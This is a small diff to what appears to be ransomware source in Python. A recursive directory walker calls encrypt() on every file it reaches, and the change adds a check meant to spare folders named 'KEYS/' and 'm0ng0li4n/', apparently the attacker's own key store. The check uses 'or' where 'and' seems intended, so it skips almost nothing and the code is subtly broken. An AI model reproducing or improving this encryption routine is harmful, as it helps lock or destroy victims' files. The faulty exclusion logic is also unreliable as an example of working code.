@@ -54,7 +54,10 @@ def dir(path):
 		lst = os.listdir(path)
 		for i in range(len(lst)):
 			lst[i] = path + "/" + lst[i]
-			dir(lst[i])
+			if 'KEYS/' not in lst[i] or 'm0ng0li4n/' not in lst[i]:
+				dir(lst[i])
+			else:
+				pass
 	except:
 		try:
 			status = encrypt(path)
